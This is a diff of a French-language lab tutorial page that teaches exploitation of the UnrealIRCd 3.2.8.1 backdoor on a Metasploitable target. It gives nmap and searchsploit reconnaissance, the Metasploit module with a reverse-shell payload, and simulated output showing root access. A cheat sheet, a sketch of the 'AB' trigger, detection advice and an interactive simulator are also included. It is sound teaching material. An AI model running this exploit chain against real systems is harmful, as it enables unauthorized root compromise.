-            <pre><span class="prompt">$</span> msfconsole<button class="copy-btn" type="button" data-copy="msfconsole" aria-label="Copier la commande" title="Copier">⧉</button>
-<span class="out">Metasploit tip: You can pivot connections over sessions started with the ssh_login modules</span>
-<span class="out"></span>
-<span class="out">=[ metasploit v6.4.135-dev                               ]</span>
-<span class="out">+ -- --=[ 2654 exploits - 1338 auxiliary - 2141 payloads  ]</span>
-<span class="out">+ -- --=[ 433 post - 49 encoders - 14 nops - 12 evasion   ]</span>
-<span class="out"></span>
-<span class="out">Metasploit Documentation: https://docs.metasploit.com/</span>
-
-<span class="prompt">msf ></span> search unrealircd<button class="copy-btn" type="button" data-copy="search unrealircd" aria-label="Copier la commande" title="Copier">⧉</button>
-<span class="out">#  Name                                      Disclosure Date  Rank       Check  Description</span>
-<span class="out">-  ----                                      ---------------  ----       -----  -----------</span>
-<span class="out">0  exploit/unix/irc/unreal_ircd_3281_backdoor  2010-06-12    excellent  Yes    UnrealIRCD 3.2.8.1 Backdoor Command Execution</span>
-
-<span class="prompt">msf ></span> use exploit/unix/irc/unreal_ircd_3281_backdoor<button class="copy-btn" type="button" data-copy="use exploit/unix/irc/unreal_ircd_3281_backdoor" aria-label="Copier la commande" title="Copier">⧉</button>
-<span class="prompt">msf exploit(unreal_ircd_3281_backdoor) ></span> set payload cmd/unix/reverse<button class="copy-btn" type="button" data-copy="set payload cmd/unix/reverse" aria-label="Copier la commande" title="Copier">⧉</button>
-<span class="ok">payload => cmd/unix/reverse</span>
-
-<span class="prompt">msf exploit(unreal_ircd_3281_backdoor) ></span> set RHOSTS 192.168.56.20<button class="copy-btn" type="button" data-copy="set RHOSTS 192.168.56.20" aria-label="Copier la commande" title="Copier">⧉</button>
-<span class="ok">RHOSTS => 192.168.56.20</span>
-
-<span class="prompt">msf exploit(unreal_ircd_3281_backdoor) ></span> set LHOST 192.168.56.10<button class="copy-btn" type="button" data-copy="set LHOST 192.168.56.10" aria-label="Copier la commande" title="Copier">⧉</button>
-<span class="ok">LHOST => 192.168.56.10</span></pre>
+            <pre><span class="prompt">$</span> searchsploit unrealircd<button class="copy-btn" type="button" data-copy="searchsploit unrealircd" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="out">UnrealIRCd 3.2.8.1 - Backdoor Command Execution        | linux/remote/16921.rb</span>
+<span class="out">UnrealIRCd 3.2.8.1 - Backdoor Command Execution (MSF)  | linux/remote/17900.rb</span></pre>
           </div>
           <div class="explain">
-            <span class="k">backdoor</span><span class="v">du code malveillant ajouté dans l'archive officielle Unreal3.2.8.1.tar.gz. La backdoor écoute les messages IRC et exécute toute commande préfixée par une séquence précise (voir section Anatomie).</span>
-            <span class="k">payload</span><span class="v">on choisit <strong>cmd/unix/reverse</strong> : un shell Unix brut qui rappelle Kali. Pas de meterpreter, car le service IRC n'est pas compatible avec les payloads binaires complexes.</span>
-            <span class="k">RHOSTS / LHOST</span><span class="v">la cible et l'adresse de retour — même logique que le cours #1. La cible recevra le message piégé, puis rappellera Kali sur le port d'écoute.</span>
+            <span class="k">bilan</span><span class="v">Deux résultats. Le second (17900.rb) est <strong>déjà intégré à Metasploit</strong> — c'est celui-ci qu'il faut charger.</span>
+            <span class="k">.rb</span><span class="v">Module Ruby prêt pour msfconsole.</span>
           </div>
         </div>
 
         <div class="step">
           <div class="step-num">4</div>
-          <h3>Exploitation — run</h3>
-          <p class="step-sub">La backdoor est activée par un message IRC spécial. Metasploit le fait automatiquement et ouvre un shell en retour.</p>
+          <h3>Chargement du module Metasploit</h3>
           <div class="term">
-            <div class="term-bar"><span class="dot"></span>msfconsole</div>
-            <pre><span class="prompt">msf exploit(unreal_ircd_3281_backdoor) ></span> run<button class="copy-btn" type="button" data-copy="run" aria-label="Copier la commande" title="Copier">⧉</button>
-<span class="out">[*] Started reverse TCP handler on 192.168.56.10:4444</span>
-<span class="out">[*] Connected to 192.168.56.20:6667...</span>
-<span class="ok">[+] Backdoor triggered! Command execution confirmed</span>
-<span class="ok">[*] Command shell session 1 opened (192.168.56.10:4444 -> 192.168.56.20:42617)</span></pre>
+            <div class="term-bar"><span class="dot"></span>kali@kali</div>
+            <pre><span class="prompt">$</span> msfconsole<button class="copy-btn" type="button" data-copy="msfconsole" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="prompt">msf ></span> search unrealircd<button class="copy-btn" type="button" data-copy="search unrealircd" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="out">0  exploit/unix/irc/unreal_ircd_3281_backdoor  2010-06-12  excellent  Yes</span>
+
+<span class="prompt">msf ></span> use exploit/unix/irc/unreal_ircd_3281_backdoor<button class="copy-btn" type="button" data-copy="use exploit/unix/irc/unreal_ircd_3281_backdoor" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="prompt">msf exploit(unreal_ircd_3281_backdoor) ></span></pre>
           </div>
           <div class="explain">
-            <span class="k">reverse handler</span><span class="v">Metasploit ouvre d'abord un listener local — la cible va rappeler sur ce port une fois la backdoor activée.</span>
-            <span class="k">backdoor triggered</span><span class="v">le message IRC piégé a déclenché l'exécution du payload. La cible a ouvert une connexion retour vers Kali.</span>
-            <span class="k">cmd shell session</span><span class="v">un shell Unix brut — <strong>pas</strong> meterpreter. On est directement dans un interpréteur de commandes système, sans couche intermédiaire.</span>
+            <span class="k">backdoor</span><span class="v">Code malveillant ajouté dans l'archive officielle. La backdoor écoute les messages IRC et exécute toute commande préfixée par « AB ».</span>
+            <span class="k">rank</span><span class="v">excellent — fiable, sans risque de planter le service.</span>
           </div>
         </div>
 
         <div class="step">
           <div class="step-num">5</div>
-          <h3>Vérification de l'accès root</h3>
-          <p class="step-sub">Le service tournait en root — une simple commande suffit à confirmer l'identité obtenue.</p>
+          <h3>Configuration — payload + RHOSTS + LHOST</h3>
           <div class="term">
-            <div class="term-bar"><span class="dot"></span>root@metasploitable</div>
-            <pre><span class="prompt">#</span> id<button class="copy-btn" type="button" data-copy="id" aria-label="Copier la commande" title="Copier">⧉</button>
+            <div class="term-bar"><span class="dot"></span>msfconsole</div>
+            <pre><span class="prompt">msf exploit(…) ></span> set payload cmd/unix/reverse<button class="copy-btn" type="button" data-copy="set payload cmd/unix/reverse" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="ok">payload => cmd/unix/reverse</span>
+<span class="prompt">msf exploit(…) ></span> set RHOSTS 192.168.56.20<button class="copy-btn" type="button" data-copy="set RHOSTS 192.168.56.20" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="ok">RHOSTS => 192.168.56.20</span>
+<span class="prompt">msf exploit(…) ></span> set LHOST 192.168.56.10<button class="copy-btn" type="button" data-copy="set LHOST 192.168.56.10" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="ok">LHOST => 192.168.56.10</span></pre>
+          </div>
+          <div class="explain">
+            <span class="k">payload</span><span class="v">cmd/unix/reverse : shell Unix brut, pas de meterpreter (incompatible avec le service IRC).</span>
+            <span class="k">RHOSTS / LHOST</span><span class="v">Cible + adresse de retour, comme d'habitude.</span>
+          </div>
+        </div>
+
+        <div class="step">
+          <div class="step-num">6</div>
+          <h3>Exploitation et vérification</h3>
+          <div class="term">
+            <div class="term-bar"><span class="dot"></span>msfconsole</div>
+            <pre><span class="prompt">msf exploit(…) ></span> run<button class="copy-btn" type="button" data-copy="run" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="out">[*] Started reverse TCP handler on 192.168.56.10:4444</span>
+<span class="ok">[+] Backdoor triggered! Command execution confirmed</span>
+<span class="ok">[*] Command shell session 1 opened (192.168.56.10:4444 -> 192.168.56.20:42617)</span>
+
+<span class="prompt">#</span> id<button class="copy-btn" type="button" data-copy="id" aria-label="Copier la commande" title="Copier">⧉</button>
 <span class="ok">uid=0(root) gid=0(root) groups=0(root)</span></pre>
           </div>
           <div class="explain">
-            <span class="k">id</span><span class="v">confirme l'identité effective : <strong>uid=0(root)</strong>. Pas d'escalade supplémentaire — la backdoor hérite des privilèges du processus IRC, lancé en root.</span>
-            <span class="k">shell direct</span><span class="v">le contexte est directement <strong>root@metasploitable</strong> — pas de session meterpreter intermédiaire, pas de commande "shell" à taper.</span>
+            <span class="k">shell direct</span><span class="v">Pas de session meterpreter intermédiaire. On est directement dans un shell Unix.</span>
+            <span class="k">root direct</span><span class="v">Le service tournait en root → la backdoor hérite des droits administrateur.</span>
           </div>
         </div>
 
@@ -964,24 +187,22 @@
 
     <section id="cheatsheet">
       <h2 class="section-title">Commandes à retenir</h2>
-      <p class="section-intro">Le strict nécessaire — reconnaissance ciblée et module Metasploit.</p>
+      <p class="section-intro">Le strict nécessaire.</p>
 
       <div class="cheat-group">
         <h4>reconnaissance</h4>
         <table class="cheat">
-          <tr><td class="cmd">nmap -sV -p 6667 IP</td><td class="desc">identifier le service IRC et sa version exacte</td></tr>
-          <tr><td class="cmd">searchsploit unrealircd</td><td class="desc">recherche d'exploits publics pour ce service</td></tr>
+          <tr><td class="cmd">nmap -sV -sC IP</td><td class="desc">ports + versions + scripts</td></tr>
+          <tr><td class="cmd">searchsploit unrealircd</td><td class="desc">exploits publics</td></tr>
         </table>
       </div>
 
       <div class="cheat-group">
         <h4>metasploit</h4>
         <table class="cheat">
-          <tr><td class="cmd">search unrealircd</td><td class="desc">trouver le module dans msfconsole</td></tr>
           <tr><td class="cmd">use exploit/unix/irc/unreal_ircd_3281_backdoor</td><td class="desc">charger le module</td></tr>
-          <tr><td class="cmd">set payload cmd/unix/reverse</td><td class="desc">définir le payload (shell Unix brut)</td></tr>
-          <tr><td class="cmd">set RHOSTS IP</td><td class="desc">définir la cible</td></tr>
-          <tr><td class="cmd">set LHOST IP</td><td class="desc">définir ton IP, pour le reverse shell</td></tr>
+          <tr><td class="cmd">set payload cmd/unix/reverse</td><td class="desc">payload adapté (pas meterpreter)</td></tr>
+          <tr><td class="cmd">set RHOSTS / set LHOST</td><td class="desc">cible + adresse de retour</td></tr>
           <tr><td class="cmd">run</td><td class="desc">lancer l'exploit</td></tr>
         </table>
       </div>
@@ -989,9 +210,8 @@
       <div class="cheat-group">
         <h4>post-exploitation</h4>
         <table class="cheat">
-          <tr><td class="cmd">id</td><td class="desc">identité + groupes, confirme l'accès root</td></tr>
-          <tr><td class="cmd">whoami</td><td class="desc">identité courte</td></tr>
-          <tr><td class="cmd">pwd</td><td class="desc">répertoire courant</td></tr>
+          <tr><td class="cmd">whoami / id</td><td class="desc">identité et groupes</td></tr>
+          <tr><td class="cmd">pwd / ls /</td><td class="desc">explorer le système</td></tr>
         </table>
       </div>
     </section>
@@ -1001,64 +221,62 @@
       <div class="concepts">
         <div class="concept">
           <h4>Backdoor ≠ vulnérabilité classique</h4>
-          <p>Comme pour vsftpd, cette faille n'est pas un bug du logiciel. C'est une archive officielle modifiée après compromission du serveur de distribution. La backdoor ne s'exploite pas en détournant un comportement du programme : elle s'active en envoyant un message précis que le code malveillant attend.</p>
+          <p>Comme pour vsftpd, c'est une archive officielle modifiée après compromission du serveur de distribution. Pas d'exploit technique — juste un motif de message à envoyer.</p>
         </div>
         <div class="concept">
           <h4>Une commande magique comme déclencheur</h4>
-          <p>Contrairement à vsftpd qui utilisait un déclencheur dans le login FTP, UnrealIRCd 3.2.8.1 écoute les messages IRC. Toute commande préfixée par <strong>AB</strong> est interprétée comme une commande shell à exécuter sur le serveur. C'est cette simplicité qui rend la backdoor dangereuse : un simple message dans un canal IRC suffit.</p>
+          <p>UnrealIRCd 3.2.8.1 écoute les messages IRC. Toute commande préfixée par <strong>AB</strong> est interprétée comme une commande shell. Un simple message suffit.</p>
         </div>
         <div class="concept">
           <h4>Pas de meterpreter — un shell Unix brut</h4>
-          <p>Le module utilise <strong>cmd/unix/reverse</strong>, pas un payload meterpreter. Le service IRC ne fournit pas le contexte nécessaire pour charger un binaire complexe. On obtient directement un shell système, avec les droits du processus IRC — ici root. Pas de session meterpreter intermédiaire, pas de commande shell à taper : on est immédiatement dans le shell.</p>
+          <p>Le module utilise <strong>cmd/unix/reverse</strong>. On obtient directement un shell système, sans couche intermédiaire.</p>
         </div>
       </div>
     </section>
 
     <section id="anatomie">
       <h2 class="section-title">Anatomie de la backdoor</h2>
-      <p class="section-intro">Comment du code malveillant s'est retrouvé dans l'archive officielle d'UnrealIRCd, et comment il s'active.</p>
+      <p class="section-intro">Comment du code malveillant s'est retrouvé dans l'archive officielle d'UnrealIRCd.</p>
 
       <div class="concepts">
         <div class="concept">
           <h4>Une archive piégée sur le site officiel</h4>
-          <p>Entre novembre 2009 et juin 2010, l'archive <code style="font-family:var(--mono); color:var(--text);">Unreal3.2.8.1.tar.gz</code> proposée sur le site officiel d'UnrealIRCd a été remplacée par une version modifiée. Le numéro de version affiché restait 3.2.8.1 — rien ne distinguait l'archive légitime de la piégée, sauf une vérification de hash.</p>
+          <p>Entre novembre 2009 et juin 2010, l'archive <code style="font-family:var(--mono); color:var(--text);">Unreal3.2.8.1.tar.gz</code> proposée sur le site officiel a été remplacée par une version modifiée. Le numéro affiché restait 3.2.8.1.</p>
         </div>
         <div class="concept">
-          <h4>Le déclencheur — commande préfixée "AB"</h4>
-          <p>La backdoor injectée dans le code source d'UnrealIRCd écoute les messages IRC envoyés au serveur. Tout message commençant par <strong>AB</strong> est interprété comme une commande shell à exécuter directement sur le serveur, avec les privilèges du processus IRC — ici root.</p>
+          <h4>Le déclencheur — commande préfixée « AB »</h4>
+          <p>Tout message commençant par <strong>AB</strong> est interprété comme une commande shell, exécutée avec les privilèges du processus IRC (ici root).</p>
           <div class="term" style="margin-top:14px;">
-            <div class="term-bar"><span class="dot"></span>reconstruction pédagogique — pas le code source exact</div>
-            <pre style="color:var(--muted);">// principe du contrôle ajouté au traitement des messages IRC (simplifié)
+            <div class="term-bar"><span class="dot"></span>reconstruction pédagogique — pas le code exact</div>
+            <pre style="color:var(--muted);">// principe du contrôle ajouté au traitement des messages IRC
 <span class="out">if (message starts with "AB") {</span>
-<span class="out">    execute_shell_command(message + 2); // saute le préfixe et exécute le reste</span>
+<span class="out">    execute_shell_command(message + 2);</span>
 <span class="out">}</span></pre>
           </div>
-          <p style="margin-top:14px;">Le module Metasploit utilisé plus haut envoie exactement ce type de message : il se connecte au port 6667, envoie une commande préfixée par "AB", et récupère le shell ouvert en retour.</p>
         </div>
         <div class="concept">
           <h4>Pourquoi ça change la méthode de recherche</h4>
-          <p>Comme pour vsftpd, seule une vérification d'intégrité de l'archive téléchargée (hash SHA-1 ou MD5 comparé à celui publié par les mainteneurs) aurait permis de détecter la compromission avant installation. L'analyse du code source lui-même n'aurait rien révélé d'anormal si l'archive légitime avait été utilisée.</p>
+          <p>Seule une vérification d'intégrité (hash SHA-1 ou MD5) aurait permis de détecter la compromission avant installation.</p>
         </div>
       </div>
     </section>
 
     <section id="detection">
       <h2 class="section-title">Détection &amp; remédiation</h2>
-      <p class="section-intro">Le point de vue du défenseur : comment cette backdoor aurait pu être repérée et ce qui limite son impact.</p>
 
       <div class="cheat-group">
         <table class="cheat">
-          <tr><td class="cmd">sha1sum Unreal3.2.8.1.tar.gz</td><td class="desc">comparer le hash de l'archive téléchargée à celui publié par les mainteneurs — seule vérification qui aurait détecté l'archive piégée</td></tr>
-          <tr><td class="cmd">netstat -tulpn / ss -tulpn</td><td class="desc">surveiller les connexions sortantes anormales depuis le serveur IRC — la backdoor initie des connexions sortantes vers l'attaquant</td></tr>
-          <tr><td class="cmd">règle IDS (Snort/Suricata)</td><td class="desc">signature pour les messages IRC commençant par "AB" — détecte la tentative d'exploitation en surveillance réseau</td></tr>
-          <tr><td class="cmd">mise à jour vers UnrealIRCd ≥ 3.2.8.1 (version corrigée)</td><td class="desc">téléchargée depuis une source vérifiée, avec hash contrôlé. Ne pas faire tourner le service en root réduit aussi l'impact.</td></tr>
+          <tr><td class="cmd">sha1sum Unreal3.2.8.1.tar.gz</td><td class="desc">comparer le hash à celui publié par les mainteneurs</td></tr>
+          <tr><td class="cmd">netstat / ss -tulpn</td><td class="desc">surveiller les connexions sortantes anormales depuis le serveur IRC</td></tr>
+          <tr><td class="cmd">règle IDS</td><td class="desc">signature pour les messages IRC commençant par "AB"</td></tr>
+          <tr><td class="cmd">ne pas tourner en root</td><td class="desc">limiter l'impact si la backdoor est exploitée</td></tr>
         </table>
       </div>
     </section>
 
     <section id="practice">
       <h2 class="section-title">Terminal d'entraînement</h2>
-      <p class="section-intro">Rejoue la chaîne d'exploitation toi-même. Le cœur de l'exercice : identifier la bonne version, trouver le module, et vérifier l'accès root obtenu.</p>
+      <p class="section-intro">Rejoue la chaîne : reconnaissance, choix du port, searchsploit, msfconsole, configuration, exploitation, vérification.</p>
 
       <div class="term-launch">
         <button class="term-launch-btn" id="term-open-btn" type="button">
@@ -1088,26 +306,22 @@
       <div class="term-fs-info">
         <span class="item">Cible <strong id="ib-target">192.168.56.20</strong></span>
         <span class="item">Attaquant <strong id="ib-attacker">192.168.56.10</strong></span>
-        <button type="button" class="notebook-btn" id="notebook-btn">📓 Carnet (<span id="notebook-count">0</span>)</button>
       </div>
       <div class="phase-track" id="phase-track"></div>
       <div class="term-progress">
         <div class="term-progress-track"><div class="term-progress-fill" id="term-progress-fill"></div></div>
-        <span class="term-progress-label" id="sim-progress">étape 1/11</span>
+        <span class="term-progress-label" id="sim-progress">étape 1/9</span>
       </div>
       <div class="term-fs-consigne" id="term-fs-consigne">
         <span class="consigne-tag" id="consigne-tag">Consigne</span>
         <span class="consigne-text" id="consigne-text">—</span>
-      </div>
-      <div class="notebook-panel" id="notebook-panel">
-        <div id="notebook-list"></div>
       </div>
     </div>
 
     <div class="sim-body" id="sim-body">
       <div class="sim-line sim-inputline" id="sim-inputline">
         <span class="p" id="sim-prompt-label">$</span>
-        <input id="sim-input" class="sim-input" type="text" placeholder="tape ta commande puis Entrée… (↑ ↓ pour l'historique)" autocomplete="off" spellcheck="false">
+        <input id="sim-input" class="sim-input" type="text" placeholder="tape ta commande puis Entrée… (↑ ↓ pour l'historique)" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" inputmode="text">
       </div>
     </div>
 
@@ -1116,153 +330,17 @@
       <div class="sim-controls">
         <button class="sim-btn" id="sim-hint-btn">💡 Indice</button>
         <button class="sim-btn" id="sim-solution-btn">🔍 Solution</button>
-        <button class="sim-btn continue" id="sim-connect-btn" style="display:none;">🔌 Connexion réseau</button>
         <button class="sim-btn" id="sim-reset-btn">↺ Recommencer</button>
       </div>
     </div>
   </div>
 
 <script>
-  // ---------- SÉQUENCE ----------
   const steps = [
     { kind:"type", phase:"recon", context:"kali@kali", prompt:"$",
-      task:"Identifie le service IRC et sa version exacte",
-      accepted:["nmap -sv -p 6667 192.168.56.20"],
-      hint:"Un scan ciblé sur le port IRC. Même outil que dans les cours précédents, options de détection de version, port 6667 et adresse de la cible.",
-      note:"nmap -sV -p 6667 &lt;cible&gt; → <strong>-sV</strong> détecte la version du service, <strong>-p 6667</strong> cible le port IRC. La version exacte (UnrealIRCd 3.2.8.1) est indispensable pour la recherche d'exploit.",
-      output:[
-        {t:"PORT     STATE SERVICE VERSION", c:"o"},
-        {t:"6667/tcp open  irc     UnrealIRCd 3.2.8.1", c:"o", id:"hl-irc"}
-      ] },
-
-    { kind:"type", phase:"recon", context:"kali@kali", prompt:"$",
-      task:"Cette bannière révèle la version exacte du service IRC. Pourquoi est-elle immédiatement suspecte ?",
-      accepted:["unrealircd 3.2.8.1"],
-      hint:"Un service IRC n'est pas anormal en soi — c'est la version précise qui doit alerter. Cette version d'UnrealIRCd est associée à un incident connu.",
-      hint2:"3.2.8.1 — c'est la version exacte qui a été piégée par une backdoor dans l'archive officielle entre 2009 et 2010. Retiens bien ce numéro.",
-      highlightIds:["hl-irc"],
-      annotation:"→ UnrealIRCd 3.2.8.1 : cette version exacte est connue pour contenir une backdoor injectée dans l'archive officielle entre 2009 et 2010. C'est un cas documenté et un module Metasploit existe.",
-      note:"UnrealIRCd 3.2.8.1 → version piégée : retenir ce numéro exact est crucial, il conditionne la recherche d'exploit.",
-      output:[] },
-
-    { kind:"type", phase:"recherche", context:"kali@kali", prompt:"$",
-      task:"Cherche un exploit public pour ce service",
-      accepted:["searchsploit unrealircd"],
-      hint:"Même réflexe que dans les cours précédents : la base d'exploits locale de Kali, avec le nom du service comme mot-clé.",
-      note:"searchsploit &lt;service&gt; → recherche large par mot-clé dans la base d'exploits locale ; affiner à la main sur les résultats.",
-      output:[
-        {t:"------------------------------------------------------- ---------------------------------", c:"o"},
-        {t:" Exploit Title                                         |  Path", c:"o"},
-        {t:"------------------------------------------------------- ---------------------------------", c:"o"},
-        {t:"UnrealIRCd 3.2.8.1 - Backdoor Command Execution        | linux/remote/16921.rb", c:"o"},
-        {t:"UnrealIRCd 3.2.8.1 - Backdoor Command Execution (MSF)  | linux/remote/17900.rb", c:"o", id:"hl-backdoor-module"},
-        {t:"------------------------------------------------------- ---------------------------------", c:"o"},
-        {t:"Shellcodes: No Results", c:"o"}
-      ] },
-
-    { kind:"type", phase:"recherche", context:"kali@kali", prompt:"$",
-      task:"Deux résultats pour cette version. Tape le chemin (fin du chemin) de celui qui mérite d'être chargé dans Metasploit.",
-      accepted:["17900.rb"],
-      wrongAnswers:{
-        "16921.rb":"Ce script Ruby est générique — regarde la ligne qui mentionne (MSF) dans son titre, c'est celle qui est déjà packagée pour Metasploit."
-      },
-      hint:"L'un des deux est déjà packagé pour Metasploit — l'autre est un script Ruby générique. Regarde la mention entre parenthèses.",
-      hint2:"\"Backdoor Command Execution (MSF)\", chemin linux/remote/17900.rb : le mot-clé MSF indique un module Metasploit prêt à charger, pas un simple script autonome.",
-      highlightIds:["hl-backdoor-module"],
-      annotation:"→ \"Backdoor Command Execution (MSF)\" : le chemin linux/remote/17900.rb correspond au module Metasploit exploit/unix/irc/unreal_ircd_3281_backdoor — rank excellent, prêt à charger.",
-      note:"Un chemin mentionnant (MSF) dans searchsploit = module déjà prêt pour Metasploit, pas un PoC à adapter.",
-      output:[] },
-
-    { kind:"type", phase:"recherche", context:"kali@kali", prompt:"$",
-      task:"Lance Metasploit",
-      accepted:["msfconsole"],
-      hint:"Le framework interactif utilisé dans le cours précédent — même commande depuis Kali.",
-      note:"msfconsole → lance la console interactive de Metasploit (recherche, chargement et configuration des modules).",
-      output:[
-        {t:"Metasploit tip: You can pivot connections over sessions started with the ssh_login modules", c:"o"},
-        {t:"", c:"o"},
-        {t:"=[ metasploit v6.4.135-dev                               ]", c:"o"},
-        {t:"+ -- --=[ 2654 exploits - 1338 auxiliary - 2141 payloads  ]", c:"o"},
-        {t:"+ -- --=[ 433 post - 49 encoders - 14 nops - 12 evasion   ]", c:"o"},
-        {t:"", c:"o"},
-        {t:"Metasploit Documentation: https://docs.metasploit.com/", c:"o"}
-      ] },
-
-    { kind:"type", phase:"recherche", context:"msf", prompt:">",
-      task:"Cherche le module Metasploit correspondant",
-      accepted:["search unrealircd"],
-      hint:"Dans msfconsole, même logique de recherche par mot-clé que pour les cours précédents. Le nom du service suffit.",
-      note:"search &lt;mot-clé&gt; (dans msfconsole) → cherche un module correspondant dans la base intégrée de Metasploit.",
-      output:[
-        {t:"#  Name                                      Disclosure Date  Rank       Check  Description", c:"o"},
-        {t:"-  ----                                      ---------------  ----       -----  -----------", c:"o"},
-        {t:"0  exploit/unix/irc/unreal_ircd_3281_backdoor  2010-06-12    excellent  Yes    UnrealIRCD 3.2.8.1 Backdoor Command Execution", c:"o", id:"hl-module-final"}
-      ] },
-
-    { kind:"type", phase:"config", context:"msf", prompt:">",
-      task:"Charge le module",
-      accepted:["use exploit/unix/irc/unreal_ircd_3281_backdoor", "use 0"],
-      hint:"La commande de chargement du module — le chemin complet donné par la recherche précédente.",
-      note:"use &lt;chemin/module&gt; → charge un module Metasploit dans le contexte courant de la console.",
-      output:[] },
-
-    { kind:"type", phase:"config", context:"msf exploit(unreal_ircd_3281_backdoor)", prompt:">",
-      task:"Définis le payload : un shell Unix brut en reverse",
-      accepted:["set payload cmd/unix/reverse"],
-      hint:"Contrairement au cours vsftpd qui utilisait meterpreter, ici le service IRC ne supporte pas les payloads binaires complexes. Il faut un payload de type shell Unix brut, qui initie une connexion retour. Cherche dans la catégorie cmd/unix/.",
-      note:"set payload cmd/unix/reverse → définit un payload de type shell Unix brut avec connexion retour (reverse), adapté aux services qui ne supportent pas meterpreter.",
-      output:[{t:"payload => cmd/unix/reverse", c:"ok"}] },
-
-    { kind:"type", phase:"config", context:"msf exploit(unreal_ircd_3281_backdoor)", prompt:">",
-      task:"Définis la cible (RHOSTS)",
-      accepted:["set rhosts 192.168.56.20"],
-      hint:"Même variable que dans les cours précédents — Remote HOST, l'adresse de la machine cible.",
-      note:"RHOSTS = adresse (ou plage) de la cible visée par le module chargé.",
-      output:[{t:"RHOSTS => 192.168.56.20", c:"ok"}] },
-
-    { kind:"type", phase:"config", context:"msf exploit(unreal_ircd_3281_backdoor)", prompt:">",
-      task:"Définis LHOST (ton IP, pour le reverse shell)",
-      accepted:["set lhost 192.168.56.10"],
-      hint:"La cible va rappeler Kali sur cette adresse une fois la backdoor activée. Même variable que dans les cours précédents.",
-      note:"LHOST = ta propre adresse ; utilisée par les payloads reverse pour que la cible te rappelle.",
-      output:[{t:"LHOST => 192.168.56.10", c:"ok"}] },
-
-    { kind:"type", phase:"exploitation", context:"msf exploit(unreal_ircd_3281_backdoor)", prompt:">",
-      task:"Lance l'exploit",
-      accepted:["run", "exploit"],
-      hint:"Tout est configuré — il ne manque que le verbe qui lance le module. Metasploit accepte deux commandes équivalentes pour ça.",
-      note:"run / exploit → lance le module chargé avec les options définies (RHOSTS, LHOST, PAYLOAD...).",
-      output:[
-        {t:"[*] Started reverse TCP handler on 192.168.56.10:4444", c:"o"},
-        {t:"[*] Connected to 192.168.56.20:6667...", c:"o"},
-        {t:"[+] Backdoor triggered! Command execution confirmed", c:"ok"},
-        {t:"[*] Command shell session 1 opened (192.168.56.10:4444 -> 192.168.56.20:42617)", c:"ok"}
-      ] },
-
-    { kind:"type", phase:"exploitation", context:"root@metasploitable", prompt:"#",
-      task:"Vérifie l'identité obtenue dans ce shell",
-      accepted:["id", "whoami"],
-      hint:"Une commande très courte, tapée dans le shell root obtenu par l'exploit. L'une affiche l'identité et les groupes, l'autre seulement le nom d'utilisateur.",
-      note:"id / whoami → vérifie l'identité effective dans le shell obtenu ; id affiche aussi les groupes, whoami seulement le nom.",
-      output:[
-        {t:"uid=0(root) gid=0(root) groups=0(root)", c:"ok"}
-      ] }
-  ];
-
-  // ---------- MODE LIBRE (après l'exploit) ----------
-  let freeContext = "root@metasploitable";
-  const freeCommands = {
-    "root@metasploitable": {
-      "whoami": [{t:"root", c:"ok"}],
-      "id": [{t:"uid=0(root) gid=0(root) groups=0(root)", c:"ok"}],
-      "pwd": [{t:"/", c:"o"}],
-      "ls": [{t:"bin  boot  dev  etc  home  lib  media  mnt  opt  proc  root  sbin  srv  sys  tmp  usr  var", c:"o"}],
-      "uname -a": [{t:"Linux metasploitable 2.6.24-16-server #1 SMP i686 GNU/Linux", c:"o"}],
-      "exit": [{t:"connexion fermée.", c:"ok"}]
-    }
-  };
-</script>
-<script src="engine.js"></script>
-
-</body>
-</html>
+      task:"Lance une reconnaissance complète sur la cible.",
+      accepted:["nmap -sv -sc 192.168.56.20"],
+      hint:"Même outil que dans les cours précédents : -sV + -sC.",
+      hint2:"nmap -sV -sC 192.168.56.20",
+      note:"nmap -sV -sC &lt;cible&gt; → point de départ standard.",
+          
